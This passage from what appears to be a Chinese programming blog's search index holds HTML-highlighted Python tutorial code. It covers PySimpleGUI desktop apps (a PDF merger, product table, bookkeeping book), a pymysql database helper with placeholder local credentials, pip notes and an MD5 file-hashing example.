class=\"string\">&#x27;-output_file-&#x27;</span>), sg.B(<span class=\"string\">&#x27;开始合并&#x27;</span>)],</span><br><span class=\"line\">        [sg.ML(size=(<span class=\"number\">80</span>, <span class=\"number\">15</span>),reroute_cprint=<span class=\"literal\">True</span>,text_color=<span class=\"string\">&#x27;purple&#x27;</span>)],</span><br><span class=\"line\">    ]</span><br><span class=\"line\"></span><br><span class=\"line\">    window = sg.Window(<span class=\"string\">&#x27;PDF合并工具&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        event, values = window.read()</span><br><span class=\"line\">        file_dir = values[<span class=\"string\">&#x27;-file_dir-&#x27;</span>]</span><br><span class=\"line\">        output_file = values[<span class=\"string\">&#x27;-output_file-&#x27;</span>]  <span class=\"comment\"># 输出的PDF文件的名称</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;开始合并&#x27;</span>:</span><br><span class=\"line\">            PDFMerge(file_dir, output_file)</span><br><span class=\"line\"></span><br><span class=\"line\">    window.close()</span><br><span class=\"line\"></span><br><span class=\"line\">main()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"46表格元素的设定方法-py\"><a href=\"#46表格元素的设定方法-py\" class=\"headerlink\" title=\"46表格元素的设定方法.py\"></a>46表格元素的设定方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">a=[<span class=\"string\">&#x27;编号&#x27;</span>,<span class=\"string\">&#x27;商品&#x27;</span>,<span class=\"string\">&#x27;价格&#x27;</span>,<span class=\"string\">&#x27;   &#x27;</span>,<span class=\"string\">&#x27;   &#x27;</span>,<span class=\"string\">&#x27;   &#x27;</span>]</span><br><span class=\"line\">b=[[<span class=\"string\">&#x27;001&#x27;</span>,<span class=\"string\">&#x27;牛奶&#x27;</span>,<span class=\"string\">&#x27;5&#x27;</span>],[<span class=\"string\">&#x27;002&#x27;</span>,<span class=\"string\">&#x27;苹果&#x27;</span>,<span class=\"string\">&#x27;6&#x27;</span>],[<span class=\"string\">&#x27;003&#x27;</span>,<span class=\"string\">&#x27;香烟&#x27;</span>,<span class=\"string\">&#x27;10&#x27;</span>]]</span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.Table(b, <span class=\"comment\">#表格内容</span></span><br><span class=\"line\">              headings=a, <span class=\"comment\"># 表格头部</span></span><br><span class=\"line\">              max_col_width=<span class=\"number\">500</span>, <span class=\"comment\"># 所有列的最大宽度</span></span><br><span class=\"line\">              auto_size_columns=<span class=\"literal\">False</span>, <span class=\"comment\"># 是否自动适应列宽度</span></span><br><span class=\"line\">              def_col_width=<span class=\"number\">10</span>, <span class=\"comment\"># 定义列表宽度</span></span><br><span class=\"line\">              display_row_numbers=<span class=\"literal\">False</span>, <span class=\"comment\"># 是否显示序号列</span></span><br><span class=\"line\">              justification=<span class=\"string\">&#x27;l&#x27;</span>, <span class=\"comment\"># 对齐方式</span></span><br><span class=\"line\">              num_rows=<span class=\"number\">10</span>, <span class=\"comment\"># 定义行数</span></span><br><span class=\"line\">              row_height=<span class=\"number\">20</span>, <span class=\"comment\"># 定义行高</span></span><br><span class=\"line\">              key=<span class=\"string\">&#x27;-a-&#x27;</span>,</span><br><span class=\"line\">              font=(<span class=\"string\">&#x27;黑体&#x27;</span>,<span class=\"number\">10</span>),</span><br><span class=\"line\">              text_color=<span class=\"literal\">None</span>,</span><br><span class=\"line\">              background_color=<span class=\"string\">&#x27;red&#x27;</span>,</span><br><span class=\"line\">              enable_events=<span class=\"literal\">True</span>,</span><br><span class=\"line\">              bind_return_key=<span class=\"literal\">True</span>,</span><br><span class=\"line\">        )]</span><br><span class=\"line\">]</span><br><span class=\"line\">window = sg.Window(<span class=\"string\">&#x27;菜单演示&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event, values = window.read()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"comment\"># if event == &#x27;打开::open&#x27;:</span></span><br><span class=\"line\">    <span class=\"comment\">#     sg.Popup(&#x27;ggg&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"47商品管理系统-py\"><a href=\"#47商品管理系统-py\" class=\"headerlink\" title=\"47商品管理系统.py\"></a>47商品管理系统.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> orm</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">sql=<span class=\"string\">&quot;SELECT * FROM products;&quot;</span></span><br><span class=\"line\">data=orm.getData(sql)</span><br><span class=\"line\">menu=[<span class=\"string\">&#x27;商品管理&#x27;</span>,[<span class=\"string\">&#x27;商品展示&#x27;</span>,<span class=\"string\">&#x27;查找商品&#x27;</span>,<span class=\"string\">&#x27;添加商品&#x27;</span>,<span class=\"string\">&#x27;删除商品&#x27;</span>,<span class=\"string\">&#x27;修改商品&#x27;</span>]],[<span class=\"string\">&#x27;订单管理&#x27;</span>,[<span class=\"string\">&#x27;查看订单&#x27;</span>,<span class=\"string\">&#x27;查找订单&#x27;</span>,<span class=\"string\">&#x27;添加订单&#x27;</span>,<span class=\"string\">&#x27;删除订单&#x27;</span>,<span class=\"string\">&#x27;修改订单&#x27;</span>]],[<span class=\"string\">&#x27;帮助&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">list</span>=[<span class=\"string\">&#x27;商品展示&#x27;</span>,<span class=\"string\">&#x27;增加商品&#x27;</span>,<span class=\"string\">&#x27;删除商品&#x27;</span>,<span class=\"string\">&#x27;修改商品&#x27;</span>]</span><br><span class=\"line\">header=[<span class=\"string\">&#x27;序号&#x27;</span>,<span class=\"string\">&#x27;商品编号&#x27;</span>,<span class=\"string\">&#x27;商品名称&#x27;</span>,<span class=\"string\">&#x27;商品金额&#x27;</span>,<span class=\"string\">&#x27;商品数量&#x27;</span>]</span><br><span class=\"line\">layout=[</span><br><span class=\"line\">\t[sg.Menu(menu,)],</span><br><span class=\"line\">\t[sg.Button(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">list</span>],</span><br><span class=\"line\">\t[sg.Table(data,headings=header,justification=<span class=\"string\">&#x27;c&#x27;</span>,auto_size_columns=<span class=\"literal\">False</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window = sg.Window(<span class=\"string\">&#x27;商品管理系统&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event, values = window.read()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"comment\"># if event == &#x27;打开::open&#x27;:</span></span><br><span class=\"line\">    <span class=\"comment\">#     sg.Popup(&#x27;ggg&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"orm-py\"><a href=\"#orm-py\" class=\"headerlink\" title=\"orm.py\"></a>orm.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pymysql</span><br><span class=\"line\"></span><br><span class=\"line\">host=<span class=\"string\">&#x27;192.168.200.2&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">3306</span></span><br><span class=\"line\">user=<span class=\"string\">&#x27;root&#x27;</span></span><br><span class=\"line\">password=<span class=\"string\">&#x27;123456&#x27;</span></span><br><span class=\"line\">dbName=<span class=\"string\">&#x27;zbcdb&#x27;</span></span><br><span class=\"line\">charset=<span class=\"string\">&#x27;utf8&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getConnection</span>():</span><br><span class=\"line\">\tdb=pymysql.Connect(host=host,port=port,user=user,passwd=password,db=dbName,charset=charset)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> db</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getData_users</span>(<span class=\"params\">sql</span>):</span><br><span class=\"line\">\tdb=getConnection()</span><br><span class=\"line\">\tcursor=db.cursor()</span><br><span class=\"line\">\tdata=<span class=\"literal\">None</span></span><br><span class=\"line\">\t<span class=\"keyword\">try</span>:</span><br><span class=\"line\">\t\tcursor.execute(sql)</span><br><span class=\"line\">\t\tdata=cursor.fetchone() <span class=\"comment\"># 获取单行结果</span></span><br><span class=\"line\">\t<span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;发生错误：&#x27;</span>,e)</span><br><span class=\"line\">\t<span class=\"keyword\">finally</span>:</span><br><span class=\"line\">\t\t<span class=\"comment\"># 关闭数据库连接和游标</span></span><br><span class=\"line\">\t\tcursor.close()</span><br><span class=\"line\">\t\tdb.close()</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查询商品及订单数据库</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getData</span>(<span class=\"params\">sql</span>):</span><br><span class=\"line\">\tdb=getConnection()</span><br><span class=\"line\">\tcursor=db.cursor()</span><br><span class=\"line\">\tdata=<span class=\"literal\">None</span></span><br><span class=\"line\">\t<span class=\"keyword\">try</span>:</span><br><span class=\"line\">\t\tcursor.execute(sql)</span><br><span class=\"line\">\t\tdata=cursor.fetchall() <span class=\"comment\"># 获取多行结果</span></span><br><span class=\"line\">\t<span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;发生错误：&#x27;</span>,e)</span><br><span class=\"line\">\t<span class=\"keyword\">finally</span>:</span><br><span class=\"line\">\t\t<span class=\"comment\"># 关闭数据库连接和游标</span></span><br><span class=\"line\">\t\tcursor.close()</span><br><span class=\"line\">\t\tdb.close()</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入数据</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">writeData</span>(<span class=\"params\">sql</span>):</span><br><span class=\"line\">\tdb=getConnection()</span><br><span class=\"line\">\tcursor=db.cursor()</span><br><span class=\"line\">\tresult=<span class=\"literal\">None</span></span><br><span class=\"line\">\t<span class=\"keyword\">try</span>:</span><br><span class=\"line\">\t\tresult=cursor.execute(sql)</span><br><span class=\"line\">\t\tdb.commit() <span class=\"comment\"># 更新操作时需要提交</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;----数据已更新！&#x27;</span>,result)</span><br><span class=\"line\">\t<span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;发生错误：&#x27;</span>,e)</span><br><span class=\"line\">\t<span class=\"keyword\">finally</span>:</span><br><span class=\"line\">\t\tcursor.close()</span><br><span class=\"line\">\t\tdb.close()</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> result</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"桌面应用开发实例\"><a href=\"#桌面应用开发实例\" class=\"headerlink\" title=\"桌面应用开发实例\"></a>桌面应用开发实例</h1><h2 id=\"1-记账本-py\"><a href=\"#1-记账本-py\" class=\"headerlink\" title=\"1.记账本.py\"></a>1.记账本.py</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"><span class=\"keyword\">import</span> datetime</span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"><span class=\"comment\"># d = &#x27;[&#123;&quot;时间&quot;: &quot;2022/05/07 14:20:21&quot;, &quot;项目&quot;: &quot;收到贷款&quot;, &quot;金额&quot;: 20000, &quot;分类&quot;: &quot;收入&quot;&#125;]&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># with open(r&quot;data.txt&quot;, &quot;w&quot;) as f:</span></span><br><span class=\"line\"><span class=\"comment\">#     f.write(d)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">readData</span>():</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">r&quot;data.txt&quot;</span>, <span class=\"string\">&quot;r&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        jsonData=f.read()</span><br><span class=\"line\">        dataList=json.loads(jsonData)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> dataList</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">writeData</span>(<span class=\"params\">dateList</span>): <span class=\"comment\"># 写入数据</span></span><br><span class=\"line\">    jsonData=json.dumps(dateList,ensure_ascii=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">r&quot;data.txt&quot;</span>, <span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        jsonData=f.write(jsonData)</span><br><span class=\"line\">        sg.popup(<span class=\"string\">&#x27;账单录入成功&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">showData</span>():</span><br><span class=\"line\">    data = readData()</span><br><span class=\"line\">    dataLists=[]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> d <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> d[<span class=\"string\">&quot;分类&quot;</span>] == <span class=\"string\">&quot;收入&quot;</span>:</span><br><span class=\"line\">            dataList=[d[<span class=\"string\">&quot;时间&quot;</span>],d[<span class=\"string\">&quot;项目&quot;</span>],d[<span class=\"string\">&quot;金额&quot;</span>],d[<span class=\"string\">&quot;分类&quot;</span>]]</span><br><span class=\"line\">            dataLists.append(dataList)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            dataList=[d[<span class=\"string\">&quot;时间&quot;</span>],d[<span class=\"string\">&quot;项目&quot;</span>],d[<span class=\"string\">&quot;金额&quot;</span>]*-<span class=\"number\">1</span>,d[<span class=\"string\">&quot;分类&quot;</span>]]</span><br><span class=\"line\">            dataLists.append(dataList)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> dataLists</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sumin</span>():</span><br><span class=\"line\">    sumin = <span class=\"number\">0</span></span><br><span class=\"line\">    data=readData()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> d <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> d[<span class=\"string\">&quot;分类&quot;</span>] == <span class=\"string\">&quot;收入&quot;</span>:</span><br><span class=\"line\">            sumin += d[<span class=\"string\">&quot;金额&quot;</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sumin</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sumout</span>(): <span class=\"comment\"># 总支出计算</span></span><br><span class=\"line\">    sumout = <span class=\"number\">0</span></span><br><span class=\"line\">    data=readData()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> d <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> d[<span class=\"string\">&quot;分类&quot;</span>] == <span class=\"string\">&quot;支出&quot;</span>:</span><br><span class=\"line\">            sumout += d[<span class=\"string\">&quot;金额&quot;</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sumout</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">addData</span>(<span class=\"params\">content,amount,cla</span>): <span class=\"comment\"># 增加账目数据</span></span><br><span class=\"line\">    dataList=readData()</span><br><span class=\"line\">    t=datetime.datetime.now().strftime(<span class=\"string\">&quot;%Y/%m/%d %H:%M:%S&quot;</span>)</span><br><span class=\"line\">    data=&#123;<span class=\"string\">&quot;时间&quot;</span>:t, <span class=\"string\">&quot;项目&quot;</span>:content, <span class=\"string\">&quot;金额&quot;</span>:amount, <span class=\"string\">&quot;分类&quot;</span>:cla&#125;</span><br><span class=\"line\">    dataList.append(data)</span><br><span class=\"line\">    writeData(dataList)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"built_in\">list</span>=showData()</span><br><span class=\"line\">    sin = sumin()</span><br><span class=\"line\">    sout = sumout()</span><br><span class=\"line\">    layout=[</span><br><span class=\"line\">        [sg.T(<span class=\"string\">&quot;账目清单：&quot;</span>)],</span><br><span class=\"line\">        [sg.Table(<span class=\"built_in\">list</span>,headings=[<span class=\"string\">&quot;时间&quot;</span>,<span class=\"string\">&quot;项目&quot;</span>,<span class=\"string\">&quot;金额&quot;</span>,<span class=\"string\">&quot;分类&quot;</span>],</span><br><span class=\"line\">                  key=<span class=\"string\">&quot;-show-&quot;</span>,</span><br><span class=\"line\">                  justification=<span class=\"string\">&quot;c&quot;</span>,</span><br><span class=\"line\">                  auto_size_columns=<span class=\"literal\">False</span>,</span><br><span class=\"line\">                  def_col_width=<span class=\"number\">15</span></span><br><span class=\"line\">        )],</span><br><span class=\"line\">        [sg.T(<span class=\"string\">&quot;总收入&quot;</span>+<span class=\"built_in\">str</span>(sin)+<span class=\"string\">&quot;元，总支出&quot;</span>+<span class=\"built_in\">str</span>(sout)+<span class=\"string\">&quot;元，结余&quot;</span>+<span class=\"built_in\">str</span>(sin-sout)+<span class=\"string\">&quot;元&quot;</span>,key=<span class=\"string\">&quot;-text-&quot;</span>)],</span><br><span class=\"line\">        [sg.T(<span class=\"string\">&quot;请输入账单项目：&quot;</span>),sg.In(key=<span class=\"string\">&quot;-content-&quot;</span>)],</span><br><span class=\"line\">        [sg.T(<span class=\"string\">&quot;请输入账单金额：&quot;</span>),sg.In(key=<span class=\"string\">&quot;-amount-&quot;</span>)],</span><br><span class=\"line\">        [sg.T(<span class=\"string\">&quot;请输入账单分类：&quot;</span>)]+[sg.Radio(i,group_id=<span class=\"number\">1</span>,key=i)<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> [<span class=\"string\">&quot;收入&quot;</span>,<span class=\"string\">&quot;支出&quot;</span>]],</span><br><span class=\"line\">        [sg.B(<span class=\"string\">&quot;确认提交&quot;</span>)]</span><br><span class=\"line\">    </span><br><span class=\"line\">    ]</span><br><span class=\"line\"></span><br><span class=\"line\">    window=sg.Window(<span class=\"string\">&quot;记账本&quot;</span>,layout)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        event,values=window.read()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> event == <span class=\"string\">&quot;确认提交&quot;</span>:</span><br><span class=\"line\">            content=values[<span class=\"string\">&quot;-content-&quot;</span>]</span><br><span class=\"line\">            amount=<span class=\"built_in\">float</span>(values[<span class=\"string\">&quot;-amount-&quot;</span>])</span><br><span class=\"line\">            <span class=\"keyword\">for</span> k,v <span class=\"keyword\">in</span> values.items():</span><br><span class=\"line\">                <span class=\"keyword\">if</span> v == <span class=\"literal\">True</span>:</span><br><span class=\"line\">                    cla=k</span><br><span class=\"line\">                    addData(content,amount,cla)</span><br><span class=\"line\">                    <span class=\"built_in\">list</span>=showData()</span><br><span class=\"line\">                    sin=sumin()</span><br><span class=\"line\">                    sout=sumout()</span><br><span class=\"line\">                    text=<span class=\"string\">&quot;总收入&quot;</span>+<span class=\"built_in\">str</span>(sin)+<span class=\"string\">&quot;元，总支出&quot;</span>+<span class=\"built_in\">str</span>(sout)+<span class=\"string\">&quot;元，结余&quot;</span>+<span class=\"built_in\">str</span>(sin-sout)+<span class=\"string\">&quot;元&quot;</span></span><br><span class=\"line\">                    window[<span class=\"string\">&quot;-show-&quot;</span>].update(values=<span class=\"built_in\">list</span>)</span><br><span class=\"line\">                    window[<span class=\"string\">&quot;-text-&quot;</span>].update(value=text)</span><br><span class=\"line\">                    window[<span class=\"string\">&quot;-content-&quot;</span>].update(<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">                    window[<span class=\"string\">&quot;-amount-&quot;</span>].update(<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    window.close()</span><br><span class=\"line\"></span><br><span class=\"line\">main()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"data-txt\"><a href=\"#data-txt\" class=\"headerlink\" title=\"data.txt\"></a>data.txt</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[&#123;&quot;时间&quot;: &quot;2022/05/07 14:20:21&quot;, &quot;项目&quot;: &quot;收到贷款&quot;, &quot;金额&quot;: 20000, &quot;分类&quot;: &quot;收入&quot;&#125;, &#123;&quot;时间&quot;: &quot;2022/05/14 13:31:01&quot;, &quot;项目&quot;: &quot;a&quot;, &quot;金额&quot;: 20.0, &quot;分类&quot;: &quot;支出&quot;&#125;, &#123;&quot;时间&quot;: &quot;2022/05/14 13:42:46&quot;, &quot;项目&quot;: &quot;b&quot;, &quot;金额&quot;: 20.0, &quot;分类&quot;: &quot;收入&quot;&#125;, &#123;&quot;时间&quot;: &quot;2022/05/14 13:44:49&quot;, &quot;项目&quot;: &quot;s&quot;, &quot;金额&quot;: 31.0, &quot;分类&quot;: &quot;收入&quot;&#125;, &#123;&quot;时间&quot;: &quot;2022/05/14 13:45:09&quot;, &quot;项目&quot;: &quot;n&quot;, &quot;金额&quot;: 67.0, &quot;分类&quot;: &quot;支出&quot;&#125;, &#123;&quot;时间&quot;: &quot;2022/05/14 13:45:18&quot;, &quot;项目&quot;: &quot;t&quot;, &quot;金额&quot;: 65.0, &quot;分类&quot;: &quot;收入&quot;&#125;]</span><br></pre></td></tr></table></figure>\n\n","categories":["python"],"tags":["图形界面"]},{"title":"python数据库操作","url":"/2022/08/17/python%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/","content":"<h1 id=\"ImportantNotes-txt\"><a href=\"#ImportantNotes-txt\" class=\"headerlink\" title=\"ImportantNotes.txt\"></a>ImportantNotes.txt</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">修改pip安装源：</span><br><span class=\"line\">在&quot;c:\\users\\***\\pip\\&quot;下创建&quot;pip.ini&quot;文件</span><br><span class=\"line\">文件内写上：</span><br><span class=\"line\">[global]</span><br><span class=\"line\">index-url=https://pypi.doubanio.com/simple</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">查看依赖库版本：pip freeze / pip list</span><br><span class=\"line\">安装指定版本依赖库：pip install ***==x.x.x</span><br><span class=\"line\">生成所需依赖库txt文件：pip freeze &gt; requirements.txt</span><br><span class=\"line\">根据已有依赖库txt文件安装库：pip install -r requirements.txt</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"哈希存储与哈希算法-py\"><a href=\"#哈希存储与哈希算法-py\" class=\"headerlink\" title=\"哈希存储与哈希算法.py\"></a>哈希存储与哈希算法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    digester = hashlib.md5()</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;Python-3.9.5.tar.xz&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> file_stream:</span><br><span class=\"line\">        file_iter = <span class=\"built_in\">iter</span>(<span class=\"keyword\">lambda</span>: file_stream.read(<span class=\"number\">1024</span>), <span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> data <span class=\"keyword\">in</span> file_iter:</span><br><span class=\"line\">            digester.update(data)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># data = file_stream.read(1024)</span></span><br><span class=\"line\">        <span class=\"comment\"># while data:</span></span><br><span class=\"line\">        <span class=\"comment\">#     digester.update(data)</span></span><br><span class=\"line\">        <span class=\"comment\">#     data = file_stream.read(1024)</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(digester.hexdigest())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"向表中增加删除数据-py\"><a href=\"#向表中增加删除数据-py\" class=\"headerlink\" title=\"向表中增加删除数据.py\"></a>向表中增加删除数据.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pymysql</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    no = <span class=\"built_in\">int</span>(<span class=\"built_in\">input</span>(<span class=\"string\">&#x27;The teaid need to delete: &#x27;</span>))</span><br><span class=\"line\">    <span class=\"comment\"># 1.创建连接对象</span></span><br><span class=\"line\">    conn = pymysql.connect(host=<span class=\"string\">&#x27;192.168.0.5&#x27;</span>, port=<span class=\"number\">3306</span>, user=<span class=\"string\">&#x27;root&#x27;</span>,</span><br><span class=\"line\">                           password=<span class=\"string\">&#x27;123456&#x27;</span>, db=<span class=\"string\">&#x27;school&#x27;</span>, charset=<span class=\"string\">&#x27;utf8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 2.获得游标对象</span></span><br><span class=\"line\">        <span class=\"keyword\">with</span> conn.cursor() <span class=\"keyword\">as</span> cursor:</span><br><span class=\"line\">            <span class=\"comment\"># 3.执行SQL得到结果</span></span><br><span class=\"line\">            result = cursor.execute(</span><br><span class=\"line\">                <span class=\"string\">&#x27;delete from tb_teacher where teaid=%s&#x27;</span>, (no, ))</span><br><span class=\"line\">                <span class=\"comment\"># &#x27;insert into tb_teacher values (1155, &quot;张翠山&quot;, &quot;教授&quot;, 3)&#x27;)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> result == <span class=\"number\">1</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;Operate success!&#x27;</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 4.操作成功执行提交</span></span><br><span class=\"line\">            conn.commit()</span><br><span class=\"line\">    <span class=\"keyword\">except</span> pymysql.MySQLError <span class=\"keyword\">as</span> error:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(error)</span><br><span class=\"line\">        <span class=\"comment\"># 5.操作失败执行回滚</span></span><br><span class=\"line\">        conn.rollback()</span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 6.关闭连接释放资源</span></span><br><span class=\"line\">        conn.close()</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># print(conn)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"向表中更新数据-py\"><a href=\"#向表中更新数据-py\" class=\"headerlink\" title=\"向表中更新数据.py\"></a>向表中更新数据.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pymysql</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    no = <span class=\"built_in\">int</span>(<span class=\"built_in\">input</span>(<span class=\"string\">&#x27;The teaid need to update: &#x27;</span>))</span><br><span class=\"line\">    title = <span class=\"built_in\">input</span>(<span class=\"string\">&#x27;new title: &#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 1.创建连接对象</span></span><br><span class=\"line\">    conn = 